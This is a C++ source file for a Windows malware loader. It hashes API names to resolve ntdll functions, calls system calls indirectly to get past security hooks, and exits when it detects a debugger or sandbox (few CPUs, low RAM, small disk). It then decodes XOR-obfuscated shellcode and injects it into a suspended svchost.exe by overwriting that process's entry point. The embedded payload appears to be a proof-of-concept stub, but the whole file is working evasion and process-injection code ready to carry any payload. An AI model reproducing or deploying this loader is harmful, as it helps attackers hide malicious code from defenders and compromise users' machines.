#include <windows.h>
#include <winternl.h>
#include <cstdlib>

#define NtCurrentProcess()	   ((HANDLE)-1)

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define UP -32
#define DOWN 32

#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
#define FLG_HEAP_ENABLE_FREE_CHECK 0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUGGED ( FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS )

typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten

    );

EXTERN_C VOID GetSyscall(WORD systemCall);
EXTERN_C VOID GetSyscall(WORD systemCall);
EXTERN_C VOID GetSyscallAddr(INT_PTR syscallAdr);

EXTERN_C NTSTATUS myNtGetContextThread(
    IN  HANDLE  ThreadHandle,
    OUT PCONTEXT    pContext

);

EXTERN_C NTSTATUS myNtReadVirtualMemory(
    IN  HANDLE  ProcessHandle,
    IN  LPCVOID   BaseAddress,
    OUT PVOID   Buffer,
    IN  ULONG   NumberOfBytesToRead,
    OUT SIZE_T  NumberOfBytesReaded OPTIONAL

);

EXTERN_C NTSTATUS myNtWriteVirtualMemory(
    IN  HANDLE  ProcessHandle,
    IN  PVOID   BaseAddress,
    IN  PVOID   Buffer,
    IN  ULONG   NumberOfBytesToWrite,
    OUT PULONG  NumberOfBytesWritten OPTIONAL



);

struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};


DWORD calcHash(char* data) {
    DWORD hash = 0x99;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

static DWORD calcHashModule(LDR_MODULE* mdll) {
    char name[64];
    size_t i = 0;

    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = 0;
    return calcHash((char*)CharLowerA(name));
}

static HMODULE getModule(DWORD myHash) {
    HMODULE module;
    INT_PTR peb = __readgsqword(0x60);
    auto ldr = 0x18;
    auto flink = 0x10;

    auto Mldr = *(INT_PTR*)(peb + ldr);
    auto M1flink = *(INT_PTR*)(Mldr + flink);
    auto Mdl = (LDR_MODULE*)M1flink;
    do {
        Mdl = (LDR_MODULE*)Mdl->e[0].Flink;
        if (Mdl->base != NULL) {

            if (calcHashModule(Mdl) == myHash) {
                break;
            }
        }
    } while (M1flink != (INT_PTR)Mdl);

    module = (HMODULE)Mdl->base;
    return module;
}

static LPVOID getAPIAddr(HMODULE module, DWORD myHash) {

    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)module + img_dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)module + img_edt->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)module + img_edt->AddressOfNames);
    PWORD  fOrd = (PWORD)((LPBYTE)module + img_edt->AddressOfNameOrdinals);

    for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]);
        if (calcHash(pFuncName) == myHash) {
            return (LPVOID)((LPBYTE)module + fAddr[fOrd[i]]);
        }
    }
    return NULL;
}


WORD Unh00ksyscallNum(LPVOID addr) {


    WORD syscall = NULL;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        syscall = (high << 8) | low;

        return syscall;

    }

    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
                syscall = (high << 8) | low - idx;

                return syscall;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * UP);
                BYTE low = *((PBYTE)addr + 4 + idx * UP);
                syscall = (high << 8) | low + idx;

                return syscall;

            }

        }

    }
}


INT_PTR Unh00ksyscallInstr(LPVOID addr) {


    WORD syscall = NULL;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        return (INT_PTR)addr + 0x12;    // syscall

    }

    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {

                return (INT_PTR)addr + 0x12;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {

                return (INT_PTR)addr + 0x12;

            }

        }

    }

}

void funny(unsigned char* data, int len)
{
    int i;
    for (i = 0; i < len; i++)
    {
        data[i] ^= 0x13;
    }
}

void prestuff(unsigned char* code, int len) {
    for (int i = 0; i < len; i++) {
        if (i % 2 == 0) {
            code[i]--;
        }
        else {
            code[i] -= 2;
        }
    }
}

DWORD checkNtGlobalFlag() {
    PPEB ppeb = (PPEB)__readgsqword(0x60);
    DWORD myNtGlobalFlag = *(PWORD)((PBYTE)ppeb + 0xBC);
    if (myNtGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED) {
        exit(0);
    }
    return 0;
}

int main()
{ 
    checkNtGlobalFlag();
 
    
        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);
        DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
        if (numberOfProcessors < 2) exit(0);

        MEMORYSTATUSEX memoryStatus;
        memoryStatus.dwLength = sizeof(memoryStatus);
        GlobalMemoryStatusEx(&memoryStatus);
        DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
        if (RAMMB < 2048) exit(0);

        HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        DISK_GEOMETRY pDiskGeometry;
        DWORD bytesReturned;
        DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
        DWORD diskSizeGB;
        diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
        if (diskSizeGB < 100) exit(0);
        
        HMODULE mod = getModule(4097367);

        unsigned char buf[] = "\xef\x5b\x90\xf7\xe3\xfb\xd3\x13\x13\x13\x52\x42\x52\x43\x41\x42\x45\x5b\x22\xc1\x76\x5b\x98\x41\x73\x5b\x98\x41\x0b\x5b\x98\x41\x33\x5b\x98\x61\x43\x5b\x1c\xa4\x59\x59\x5e\x22\xda\x5b\x22\xd3\xbf\x2f\x72\x6f\x11\x3f\x33\x52\xd2\xda\x1e\x52\x12\xd2\xf1\xfe\x41\x52\x42\x5b\x98\x41\x33\x98\x51\x2f\x5b\x12\xc3\x98\x93\x9b\x13\x13\x13\x5b\x96\xd3\x67\x74\x5b\x12\xc3\x43\x98\x5b\x0b\x57\x98\x53\x33\x5a\x12\xc3\xf0\x45\x5b\xec\xda\x52\x98\x27\x9b\x5b\x12\xc5\x5e\x22\xda\x5b\x22\xd3\xbf\x52\xd2\xda\x1e\x52\x12\xd2\x2b\xf3\x66\xe2\x5f\x10\x5f\x37\x1b\x56\x2a\xc2\x66\xcb\x4b\x57\x98\x53\x37\x5a\x12\xc3\x75\x52\x98\x1f\x5b\x57\x98\x53\x0f\x5a\x12\xc3\x52\x98\x17\x9b\x5b\x12\xc3\x52\x4b\x52\x4b\x4d\x4a\x49\x52\x4b\x52\x4a\x52\x49\x5b\x90\xff\x33\x52\x41\xec\xf3\x4b\x52\x4a\x49\x5b\x98\x01\xfa\x44\xec\xec\xec\x4e\x5b\xa9\x12\x13\x13\x13\x13\x13\x13\x13\x5b\x9e\x9e\x12\x12\x13\x13\x52\xa9\x22\x98\x7c\x94\xec\xc6\xa8\xe3\xa6\xb1\x45\x52\xa9\xb5\x86\xae\x8e\xec\xc6\x5b\x90\xd7\x3b\x2f\x15\x6f\x19\x93\xe8\xf3\x66\x16\xa8\x54\x00\x61\x7c\x79\x13\x4a\x52\x9a\xc9\xec\xc6\x70\x72\x7f\x70\x3d\x76\x6b\x76\x13";
        //unsigned char buf[]= { 0xfd, 0x4a, 0x84, 0xe6, 0xf1, 0xea, 0xc1, 0x2, 0x1, 0x2, 0x42, 0x53, 0x42, 0x52, 0x53, 0x53, 0x57, 0x4a, 0x32, 0xd4, 0x66, 0x4a, 0x8c, 0x54, 0x61, 0x4a, 0x8c, 0x54, 0x19, 0x4a, 0x8c, 0x54, 0x21, 0x4a, 0x8c, 0x74, 0x51, 0x4a, 0x10, 0xb9, 0x4b, 0x4c, 0x4e, 0x33, 0xca, 0x4a, 0x32, 0xc2, 0xad, 0x3e, 0x62, 0x7e, 0x3, 0x2e, 0x21, 0x43, 0xc2, 0xcb, 0xe, 0x43, 0x2, 0xc3, 0xe3, 0xef, 0x53, 0x43, 0x52, 0x4a, 0x8c, 0x54, 0x21, 0x8d, 0x43, 0x3e, 0x49, 0x3, 0xd1, 0x8d, 0x81, 0x8a, 0x1, 0x2, 0x1, 0x4a, 0x86, 0xc2, 0x75, 0x69, 0x49, 0x3, 0xd1, 0x52, 0x8c, 0x4a, 0x19, 0x46, 0x8c, 0x42, 0x21, 0x4b, 0x2, 0xd2, 0xe4, 0x58, 0x49, 0x101, 0xca, 0x43, 0x8c, 0x36, 0x89, 0x4a, 0x2, 0xd8, 0x4e, 0x33, 0xca, 0x4a, 0x32, 0xc2, 0xad, 0x43, 0xc2, 0xcb, 0xe, 0x43, 0x2, 0xc3, 0x39, 0xe2, 0x76, 0xf3, 0x4d, 0x5, 0x4d, 0x26, 0x9, 0x47, 0x3a, 0xd3, 0x76, 0xda, 0x59, 0x46, 0x8c, 0x42, 0x25, 0x4b, 0x2, 0xd2, 0x67, 0x43, 0x8c, 0xe, 0x49, 0x46, 0x8c, 0x42, 0x1d, 0x4b, 0x2, 0xd2, 0x42, 0x8d, 0x5, 0x8a, 0x49, 0x3, 0xd1, 0x43, 0x59, 0x43, 0x59, 0x60, 0x5a, 0x5c, 0x42, 0x5a, 0x42, 0x5b, 0x42, 0x5c, 0x49, 0x85, 0xed, 0x22, 0x42, 0x54, 0x100, 0xe2, 0x59, 0x43, 0x5a, 0x5c, 0x49, 0x8d, 0x13, 0xeb, 0x58, 0x101, 0x100, 0x101, 0x5e, 0x4a, 0xbb, 0x3, 0x1, 0x2, 0x1, 0x2, 0x1, 0x2, 0x1, 0x4a, 0x8e, 0x8f, 0x2, 0x3, 0x1, 0x2, 0x42, 0xbc, 0x32, 0x8d, 0x70, 0x89, 0x100, 0xd7, 0xbc, 0xf2, 0xb6, 0xa4, 0x57, 0x43, 0xbb, 0xa8, 0x96, 0xbf, 0x9e, 0x101, 0xd6, 0x4a, 0x84, 0xc6, 0x29, 0x3e, 0x7, 0x7e, 0xb, 0x82, 0xfc, 0xe2, 0x76, 0x7, 0xbc, 0x49, 0x14, 0x74, 0x70, 0x6c, 0x1, 0x5b, 0x42, 0x8b, 0xdb, 0x101, 0xd6, 0x65, 0x62, 0x6e, 0x64, 0x30, 0x66, 0x7a, 0x66, 0x2 };
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        
        CreateProcessA(NULL,
            (LPSTR)"C:\\Windows\\system32\\svchost.exe",
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi);
            
    

        LPVOID addr = NULL;
        WORD syscallNum = NULL;
        INT_PTR syscallAddr = NULL;

        CONTEXT ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.ContextFlags = CONTEXT_FULL;

        addr = getAPIAddr(mod, 76093572262);
        syscallNum = Unh00ksyscallNum(addr);
        syscallAddr = Unh00ksyscallInstr(addr);

        GetSyscall(syscallNum);
        GetSyscallAddr(syscallAddr);

        NTSTATUS  status1 = myNtGetContextThread(pi.hThread, &ctx);

        DWORD_PTR pebAddress = ctx.Rdx;
        PEB peb;
        memset(&peb, 0, sizeof(peb));
        SIZE_T bytesRead = NULL;


        addr = getAPIAddr(mod, 228701921503); 
        syscallNum = Unh00ksyscallNum(addr);
        syscallAddr = Unh00ksyscallInstr(addr);

        GetSyscall(syscallNum);
        GetSyscallAddr(syscallAddr);

        NTSTATUS status2 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)pebAddress, &peb, sizeof(peb), bytesRead);
     
        
    
        
        DWORD_PTR imageBaseAddress = pebAddress + 0x010;
        DWORD_PTR imageBaseValue = 0;
        SIZE_T bytesReadAgain = NULL;

        NTSTATUS status3 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)imageBaseAddress, &imageBaseValue, sizeof(imageBaseValue), bytesReadAgain);

  
        BYTE headersBuffer[4096] = {};
        

        NTSTATUS status4 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)imageBaseValue, headersBuffer, 4096, NULL);

        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
        LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imageBaseValue);
  
        int len = sizeof(buf) - 1;

        funny(buf, len);
        //prestuff(buf, len);
        WriteProcessMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
        ResumeThread(pi.hThread);

        return 0;
    }





